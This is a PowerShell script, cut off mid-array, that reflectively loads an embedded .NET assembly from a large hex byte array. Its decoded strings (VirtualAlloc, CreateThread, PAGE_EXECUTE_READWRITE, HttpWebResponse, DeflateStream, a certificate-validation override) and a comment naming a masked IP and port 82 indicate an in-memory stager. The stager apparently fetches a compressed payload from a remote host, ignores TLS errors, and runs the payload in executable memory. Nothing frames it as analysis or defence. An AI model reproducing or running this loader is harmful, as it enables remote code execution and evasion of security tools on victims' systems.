# ip 203.xx.xx.xx port 82
function NONONO{
  if(-not ([System.Management.Automation.PSTypeName]"NONONO").Type) {
    [Reflection.Assembly]::Load([byte[]]@(0x4d,0x5a,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x0e,0x1f,0xba,0x0e,0x00,0xb4,0x09,0xcd,0x21,0xb8,0x01,0x4c,0xcd,0x21,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x20,0x63,0x61,0x6e,0x6e,0x6f,0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6e,0x20,0x69,0x6e,0x20,0x44,0x4f,0x53,0x20,0x6d,0x6f,0x64,0x65,0x2e,0x0d,0x0d,0x0a,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,0x64,0x86,0x02,0x00,0x38,0xdc,0x8f,0xe4,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x00,0x22,0x20,0x0b,0x02,0x30,0x00,0x00,0x10,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x80,0x01,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x02,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x40,0x85,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x88,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x2f,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2e,0x74,0x65,0x78,0x74,0x00,0x00,0x00,0x97,0x0f,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x60,0x2e,0x72,0x73,0x72,0x63,0x00,0x00,0x00,0x88,0x03,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x02,0x00,0x05,0x00,0x90,0x21,0x00,0x00,0x84,0x0d,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x30,0x02,0x00,0x1f,0x00,0x00,0x00,0x01,0x00,0x00,0x11,0x02,0x73,0x10,0x00,0x00,0x0a,0x73,0x11,0x00,0x00,0x0a,0x0a,0x16,0x73,0x12,0x00,0x00,0x0a,0x06,0x6f,0x13,0x00,0x00,0x0a,0x06,0x6f,0x14,0x00,0x00,0x0a,0x2a,0x00,0x13,0x30,0x06,0x00,0xee,0x00,0x00,0x00,0x02,0x00,0x00,0x11,0x72,0x01,0x00,0x00,0x70,0x28,0x15,0x00,0x00,0x0a,0x72,0x15,0x00,0x00,0x70,0x28,0x16,0x00,0x00,0x0a,0x7e,0x0c,0x00,0x00,0x04,0x25,0x2d,0x17,0x26,0x7e,0x0b,0x00,0x00,0x04,0xfe,0x06,0x09,0x00,0x00,0x06,0x73,0x17,0x00,0x00,0x0a,0x25,0x80,0x0c,0x00,0x00,0x04,0x28,0x18,0x00,0x00,0x0a,0x74,0x16,0x00,0x00,0x01,0x28,0x19,0x00,0x00,0x0a,0x28,0x1a,0x00,0x00,0x0a,0x74,0x20,0x00,0x00,0x01,0x6f,0x1b,0x00,0x00,0x0a,0x74,0x12,0x00,0x00,0x01,0x0a,0x06,0x6f,0x1c,0x00,0x00,0x0a,0x0b,0x06,0x6f,0x1d,0x00,0x00,0x0a,0xd4,0x8d,0x22,0x00,0x00,0x01,0x0c,0x08,0x8e,0x69,0x0d,0x16,0x13,0x04,0x07,0x08,0x11,0x04,0x17,0x6f,0x1e,0x00,0x00,0x0a,0x13,0x08,0x11,0x04,0x11,0x08,0x58,0x13,0x04,0x09,0x11,0x08,0x59,0x0d,0x09,0x16,0x30,0xe4,0x06,0x6f,0x1f,0x00,0x00,0x0a,0x08,0x28,0x04,0x00,0x00,0x06,0x0c,0x72,0x83,0x00,0x00,0x70,0x28,0x20,0x00,0x00,0x0a,0x7e,0x21,0x00,0x00,0x0a,0x08,0x8e,0x69,0x6a,0x20,0x00,0x10,0x00,0x00,0x1f,0x40,0x28,0x01,0x00,0x00,0x06,0x13,0x05,0x08,0x16,0x11,0x05,0x08,0x8e,0x69,0x28,0x22,0x00,0x00,0x0a,0x7e,0x21,0x00,0x00,0x0a,0x26,0x16,0x13,0x06,0x7e,0x21,0x00,0x00,0x0a,0x13,0x07,0x16,0x16,0x11,0x05,0x11,0x07,0x16,0x12,0x06,0x28,0x02,0x00,0x00,0x06,0x15,0x28,0x03,0x00,0x00,0x06,0x26,0x2a,0x1e,0x02,0x28,0x23,0x00,0x00,0x0a,0x2a,0x2e,0x73,0x08,0x00,0x00,0x06,0x80,0x0b,0x00,0x00,0x04,0x2a,0x1e,0x02,0x28,0x23,0x00,0x00,0x0a,0x2a,0x0a,0x17,0x2a,0x00,0x00,0x00,0x42,0x53,0x4a,0x42,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x76,0x34,0x2e,0x30,0x2e,0x33,0x30,0x33,0x31,0x39,0x00,0x00,0x00,0x00,0x05,0x00,0x6c,0x00,0x00,0x00,0x70,0x04,0x00,0x00,0x23,0x7e,0x00,0x00,0xdc,0x04,0x00,0x00,0x14,0x06,0x00,0x00,0x23,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x00,0x00,0x00,0xf0,0x0a,0x00,0x00,0x9c,0x00,0x00,0x00,0x23,0x55,0x53,0x00,0x8c,0x0b,0x00,0x00,0x10,0x00,0x00,0x00,0x23,0x47,0x55,0x49,0x44,0x00,0x00,0x00,0x9c,0x0b,0x00,0x00,0xe8,0x01,0x00,0x00,0x23,0x42,0x6c,0x6f,0x62,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x01,0x57,0x1d,0x02,0x14,0x09,0x02,0x00,0x00,0x00,0xfa,0x01,0x33,0x00,0x16,0x00,0x00,0x01,0x00,0x00,0x00,0x24,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x09,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x23,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0xd3,0x03,0x01,0x00,0x00,0x00,0x00,0x00,0x06,0x00,0x7d,0x02,0xf1,0x04,0x06,0x00,0xea,0x02,0xf1,0x04,0x06,0x00,0xb1,0x01,0xb0,0x04,0x0f,0x00,0x11,0x05,0x00,0x00,0x06,0x00,0xd9,0x01,0x4c,0x04,0x06,0x00,0x60,0x02,0x4c,0x04,0x06,0x00,0x41,0x02,0x4c,0x04,0x06,0x00,0xd1,0x02,0x4c,0x04,0x06,0x00,0x9d,0x02,0x4c,0x04,0x06,0x00,0xb6,0x02,0x4c,0x04,0x06,0x00,0xf0,0x01,0x4c,0x04,0x06,0x00,0xc5,0x01,0xd2,0x04,0x06,0x00,0xa3,0x01,0xd2,0x04,0x06,0x00,0x24,0x02,0x4c,0x04,0x06,0x00,0x0b,0x02,0x1e,0x03,0x06,0x00,0xc1,0x05,0x15,0x04,0x06,0x00,0x02,0x04,0x7f,0x00,0x0a,0x00,0x34,0x01,0xd2,0x05,0x06,0x00,0x08,0x04,0x7f,0x00,0x06,0x00,0x21,0x04,0x15,0x04,0x06,0x00,0x88,0x01,0xf1,0x04,0x0a,0x00,0x4a,0x03,0x00,0x06,0x06,0x00,0x56,0x01,0x20,0x05,0x0a,0x00,0x26,0x04,0x20,0x05,0x0a,0x00,0x71,0x05,0x00,0x06,0x0a,0x00,0xf4,0x03,0x36,0x04,0x0a,0x00,0xf1,0x00,0x36,0x04,0x06,0x00,0x09,0x01,0x15,0x04,0x0a,0x00,0x88,0x04,0xd2,0x05,0x06,0x00,0x79,0x01,0x15,0x04,0x0a,0x00,0xe8,0x05,0xd2,0x05,0x0a,0x00,0xe4,0x05,0xd2,0x05,0x0a,0x00,0x38,0x01,0xd2,0x05,0x06,0x00,0x08,0x03,0x15,0x04,0x06,0x00,0xa9,0x04,0x15,0x04,0x06,0x00,0xbe,0x03,0xd2,0x04,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x10,0x00,0xdd,0x05,0xaf,0x00,0x41,0x00,0x01,0x00,0x01,0x00,0x02,0x01,0x00,0x00,0x1c,0x04,0x00,0x00,0x51,0x00,0x01,0x00,0x07,0x00,0x02,0x01,0x00,0x00,0x5e,0x04,0x00,0x00,0x51,0x00,0x05,0x00,0x07,0x00,0x03,0x21,0x10,0x00,0xc3,0x00,0x00,0x00,0x41,0x00,0x0b,0x00,0x07,0x00,0x06,0x06,0xa2,0x00,0xc0,0x00,0x56,0x80,0x89,0x00,0xc3,0x00,0x56,0x80,0x73,0x00,0xc3,0x00,0x56,0x80,0x37,0x00,0xc3,0x00,0x06,0x06,0xa2,0x00,0xc0,0x00,0x56,0x80,0x94,0x00,0xc7,0x00,0x56,0x80,0x40,0x00,0xc7,0x00,0x56,0x80,0x66,0x00,0xc7,0x00,0x56,0x80,0x25,0x00,0xc7,0x00,0x56,0x80,0x4f,0x00,0xc7,0x00,0x36,0x00,0x18,0x00,0xcb,0x00,0x16,0x00,0x01,0x00,0xcf,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x91,0x20,0xc7,0x00,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x91,0x20,0xe4,0x00,0xdb,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x91,0x20,0xb4,0x05,0xe6,0x00,0x0b,0x00,0x48,0x20,0x00,0x00,0x00,0x00,0x96,0x00,0xa0,0x05,0xec,0x00,0x0d,0x00,0x74,0x20,0x00,0x00,0x00,0x00,0x96,0x00,0xde,0x05,0xf3,0x00,0x0e,0x00,0x6e,0x21,0x00,0x00,0x00,0x00,0x86,0x18,0x9c,0x04,0x06,0x00,0x0e,0x00,0x76,0x21,0x00,0x00,0x00,0x00,0x91,0x18,0xa2,0x04,0xf3,0x00,0x0e,0x00,0x82,0x21,0x00,0x00,0x00,0x00,0x86,0x18,0x9c,0x04,0x06,0x00,0x0e,0x00,0x8a,0x21,0x00,0x00,0x00,0x00,0x83,0x00,0x0a,0x00,0xf7,0x00,0x0e,0x00,0x00,0x00,0x01,0x00,0x75,0x04,0x00,0x00,0x02,0x00,0x19,0x03,0x00,0x00,0x03,0x00,0x23,0x01,0x00,0x00,0x04,0x00,0xc8,0x05,0x00,0x00,0x01,0x00,0x4e,0x05,0x00,0x00,0x02,0x00,0x0d,0x03,0x00,0x00,0x03,0x00,0x91,0x05,0x00,0x00,0x04,0x00,0x0f,0x04,0x00,0x00,0x05,0x00,0x61,0x05,0x00,0x00,0x06,0x00,0xd4,0x00,0x00,0x00,0x01,0x00,0x01,0x01,0x00,0x00,0x02,0x00,0xc3,0x04,0x00,0x00,0x01,0x00,0xaa,0x00,0x00,0x00,0x01,0x00,0x81,0x04,0x00,0x00,0x02,0x00,0x66,0x01,0x00,0x00,0x03,0x00,0x30,0x04,0x00,0x00,0x04,0x00,0x81,0x05,0x09,0x00,0x9c,0x04,0x01,0x00,0x11,0x00,0x9c,0x04,0x06,0x00,0x19,0x00,0x9c,0x04,0x0a,0x00,0x29,0x00,0x9c,0x04,0x10,0x00,0x31,0x00,0x9c,0x04,0x10,0x00,0x39,0x00,0x9c,0x04,0x10,0x00,0x41,0x00,0x9c,0x04,0x10,0x00,0x49,0x00,0x9c,0x04,0x10,0x00,0x51,0x00,0x9c,0x04,0x10,0x00,0x59,0x00,0x9c,0x04,0x10,0x00,0x61,0x00,0x9c,0x04,0x15,0x00,0x69,0x00,0x9c,0x04,0x10,0x00,0x71,0x00,0x9c,0x04,0x10,0x00,0x79,0x00,0x9c,0x04,0x10,0x00,0xa9,0x00,0x9c,0x04,0x06,0x00,0x89,0x00,0x9c,0x04,0x1f,0x00,0x89,0x00,0x9c,0x04,0x06,0x00,0xd1,0x00,0x9c,0x04,0x25,0x00,0x99,0x00,0x69,0x04,0x2d,0x00,0x89,0x00,0xf3,0x05,0x33,0x00,0xe1,0x00,0x82,0x01,0x47,0x00,0xe9,0x00,0x6e,0x03,0x4c,0x00,0xb1,0x00,0x9c,0x04,0x51,0x00,0xf1,0x00,0x1b,0x01,0x57,0x00,0xe9,0x00,0x96,0x03,0x60,0x00,0xf9,0x00,0x72,0x01,0x66,0x00,0xf9,0x00,0x44,0x01,0x6c,0x00,0x09,0x01,0xe2,0x03,0x72,0x00,0x09,0x01,0x38,0x03,0x77,0x00,0x99,0x00,0xdf,0x00,0x7b,0x00,0x09,0x01,0x50,0x01,0x06,0x00,0xe1,0x00,0x11,0x01,0x47,0x00,0x19,0x01,0x70,0x04,0x83,0x00,0x21,0x01,0xfb,0x05,0x86,0x00,0x81,0x00,0x9c,0x04,0x06,0x00,0x08,0x00,0x08,0x00,0x98,0x00,0x08,0x00,0x0c,0x00,0x9d,0x00,0x08,0x00,0x10,0x00,0xa2,0x00,0x08,0x00,0x18,0x00,0xa7,0x00,0x08,0x00,0x1c,0x00,0xac,0x00,0x08,0x00,0x20,0x00,0xb1,0x00,0x08,0x00,0x24,0x00,0xb6,0x00,0x08,0x00,0x28,0x00,0xbb,0x00,0x2e,0x00,0x0b,0x00,0x02,0x01,0x2e,0x00,0x13,0x00,0x0b,0x01,0x2e,0x00,0x1b,0x00,0x2a,0x01,0x2e,0x00,0x23,0x00,0x33,0x01,0x2e,0x00,0x2b,0x00,0x43,0x01,0x2e,0x00,0x33,0x00,0x43,0x01,0x2e,0x00,0x3b,0x00,0x43,0x01,0x2e,0x00,0x43,0x00,0x33,0x01,0x2e,0x00,0x4b,0x00,0x49,0x01,0x2e,0x00,0x53,0x00,0x43,0x01,0x2e,0x00,0x5b,0x00,0x43,0x01,0x2e,0x00,0x63,0x00,0x61,0x01,0x2e,0x00,0x6b,0x00,0x8b,0x01,0x2e,0x00,0x73,0x00,0x98,0x01,0xa3,0x00,0x7b,0x00,0xe0,0x01,0x1a,0x00,0x38,0x00,0xc6,0x03,0x00,0x01,0x03,0x00,0xc7,0x00,0x01,0x00,0x00,0x01,0x05,0x00,0xe4,0x00,0x01,0x00,0x00,0x01,0x07,0x00,0xb4,0x05,0x01,0x00,0x04,0x80,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xaf,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x8f,0x00,0xba,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x8f,0x00,0x15,0x04,0x00,0x00,0x00,0x00,0x03,0x00,0x02,0x00,0x04,0x00,0x02,0x00,0x05,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x3e,0x39,0x5f,0x5f,0x36,0x5f,0x30,0x00,0x3c,0x53,0x74,0x61,0x72,0x74,0x3e,0x62,0x5f,0x5f,0x36,0x5f,0x30,0x00,0x3c,0x3e,0x39,0x00,0x3c,0x4d,0x6f,0x64,0x75,0x6c,0x65,0x3e,0x00,0x50,0x41,0x47,0x45,0x5f,0x45,0x58,0x45,0x43,0x55,0x54,0x45,0x5f,0x52,0x45,0x41,0x44,0x00,0x4d,0x45,0x4d,0x5f,0x46,0x52,0x45,0x45,0x00,0x50,0x41,0x47,0x45,0x5f,0x52,0x45,0x41,0x44,0x57,0x52,0x49,0x54,0x45,0x00,0x50,0x41,0x47,0x45,0x5f,0x45,0x58,0x45,0x43,0x55,0x54,0x45,0x5f,0x52,0x45,0x41,0x44,0x57,0x52,0x49,0x54,0x45,0x00,0x50,0x41,0x47,0x45,0x5f,0x45,0x58,0x45,0x43,0x55,0x54,0x45,0x00,0x4d,0x45,0x4d,0x5f,0x52,0x45,0x53,0x45,0x52,0x56,0x45,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x00,0x4d,0x45,0x4d,0x5f,0x43,0x4f,0x4d,0x4d,0x49,0x54,0x00,0x50,0x41,0x47,0x45,0x5f,0x52,0x45,0x41,0x44,0x4f,0x4e,0x4c,0x59,0x00,0x76,0x61,0x6c,0x75,0x65,0x5f,0x5f,0x00,0x64,0x61,0x74,0x61,0x00,0x50,0x65,0x72,0x66,0x65,0x63,0x74,0x4c,0x69,0x62,0x00,0x6d,0x73,0x63,0x6f,0x72,0x6c,0x69,0x62,0x00,0x3c,0x3e,0x63,0x00,0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x41,0x6c,0x6c,0x6f,0x63,0x00,0x6c,0x70,0x54,0x68,0x72,0x65,0x61,0x64,0x49,0x64,0x00,0x52,0x65,0x61,0x64,0x00,0x43,0x72,0x65,0x61,0x74,0x65,0x54,0x68,0x72,0x65,0x61,0x64,0x00,0x43,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x69,0x6f,0x6e,0x4d,0x6f,0x64,0x65,0x00,0x68,0x48,0x61,0x6e,0x64,0x6c,0x65,0x00,0x43,0x6f,0x6e,0x73,0x6f,0x6c,0x65,0x00,0x57,0x72,0x69,0x74,0x65,0x4c,0x69,0x6e,0x65,0x00,0x43,0x6f,0x6d,0x62,0x69,0x6e,0x65,0x00,0x66,0x6c,0x41,0x6c,0x6c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x54,0x79,0x70,0x65,0x00,0x48,0x74,0x74,0x70,0x57,0x65,0x62,0x52,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x00,0x47,0x65,0x74,0x52,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x00,0x43,0x6c,0x6f,0x73,0x65,0x00,0x58,0x35,0x30,0x39,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x00,0x63,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x00,0x43,0x72,0x65,0x61,0x74,0x65,0x00,0x44,0x65,0x6c,0x65,0x67,0x61,0x74,0x65,0x00,0x57,0x72,0x69,0x74,0x65,0x00,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x47,0x65,0x6e,0x65,0x72,0x61,0x74,0x65,0x64,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x47,0x75,0x69,0x64,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x44,0x65,0x62,0x75,0x67,0x67,0x61,0x62,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x43,0x6f,0x6d,0x56,0x69,0x73,0x69,0x62,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x54,0x69,0x74,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x54,0x72,0x61,0x64,0x65,0x6d,0x61,0x72,0x6b,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x54,0x61,0x72,0x67,0x65,0x74,0x46,0x72,0x61,0x6d,0x65,0x77,0x6f,0x72,0x6b,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x46,0x69,0x6c,0x65,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,0x74,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x61,0x74,0x69,0x6f,0x6e,0x52,0x65,0x6c,0x61,0x78,0x61,0x74,0x69,0x6f,0x6e,0x73,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x50,0x72,0x6f,0x64,0x75,0x63,0x74,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x70,0x79,0x72,0x69,0x67,0x68,0x74,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x6d,0x70,0x61,0x6e,0x79,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x43,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x69,0x6c,0x69,0x74,0x79,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x42,0x79,0x74,0x65,0x00,0x64,0x77,0x53,0x74,0x61,0x63,0x6b,0x53,0x69,0x7a,0x65,0x00,0x73,0x69,0x7a,0x65,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x69,0x6e,0x67,0x00,0x67,0x65,0x74,0x5f,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x4c,0x65,0x6e,0x67,0x74,0x68,0x00,0x52,0x65,0x6d,0x6f,0x74,0x65,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x56,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x43,0x61,0x6c,0x6c,0x62,0x61,0x63,0x6b,0x00,0x67,0x65,0x74,0x5f,0x53,0x65,0x72,0x76,0x65,0x72,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x56,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x43,0x61,0x6c,0x6c,0x62,0x61,0x63,0x6b,0x00,0x73,0x65,0x74,0x5f,0x53,0x65,0x72,0x76,0x65,0x72,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x56,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x43,0x61,0x6c,0x6c,0x62,0x61,0x63,0x6b,0x00,0x4d,0x61,0x72,0x73,0x68,0x61,0x6c,0x00,0x6b,0x65,0x72,0x6e,0x65,0x6c,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x50,0x65,0x72,0x66,0x65,0x63,0x74,0x4c,0x69,0x62,0x2e,0x64,0x6c,0x6c,0x00,0x47,0x65,0x74,0x52,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x44,0x65,0x66,0x6c,0x61,0x74,0x65,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x4d,0x65,0x6d,0x6f,0x72,0x79,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x70,0x61,0x72,0x61,0x6d,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x00,0x53,0x74,0x61,0x74,0x65,0x45,0x6e,0x75,0x6d,0x00,0x58,0x35,0x30,0x39,0x43,0x68,0x61,0x69,0x6e,0x00,0x63,0x68,0x61,0x69,0x6e,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x2e,0x43,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x69,0x6f,0x6e,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x00,0x50,0x72,0x6f,0x74,0x65,0x63,0x74,0x69,0x6f,0x6e,0x00,0x43,0x6f,0x70,0x79,0x54,0x6f,0x00,0x5a,0x65,0x72,0x6f,0x00,0x6c,0x70,0x53,0x74,0x61,0x72,0x74,0x41,0x64,0x64,0x72,0x00,0x73,0x65,0x6e,0x64,0x65,0x72,0x00,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x50,0x6f,0x69,0x6e,0x74,0x4d,0x61,0x6e,0x61,0x67,0x65,0x72,0x00,0x2e,0x63,0x74,0x6f,0x72,0x00,0x2e,0x63,0x63,0x74,0x6f,0x72,0x00,0x49,0x6e,0x74,0x50,0x74,0x72,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x44,0x69,0x61,0x67,0x6e,0x6f,0x73,0x74,0x69,0x63,0x73,0x00,0x64,0x77,0x4d,0x69,0x6c,0x6c,0x69,0x73,0x65,0x63,0x6f,0x6e,0x64,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x49,0x6e,0x74,0x65,0x72,0x6f,0x70,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x73,0x00,0x44,0x65,0x62,0x75,0x67,0x67,0x69,0x6e,0x67,0x4d,0x6f,0x64,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x53,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x2e,0x43,0x72,0x79,0x70,0x74,0x6f,0x67,0x72,0x61,0x70,0x68,0x79,0x2e,0x58,0x35,0x30,0x39,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x73,0x00,0x6c,0x70,0x54,0x68,0x72,0x65,0x61,0x64,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x73,0x00,0x64,0x77,0x43,0x72,0x65,0x61,0x74,0x69,0x6f,0x6e,0x46,0x6c,0x61,0x67,0x73,0x00,0x53,0x73,0x6c,0x50,0x6f,0x6c,0x69,0x63,0x79,0x45,0x72,0x72,0x6f,0x72,0x73,0x00,0x73,0x73,0x6c,0x50,0x6f,0x6c,0x69,0x63,0x79,0x45,0x72,0x72,0x6f,0x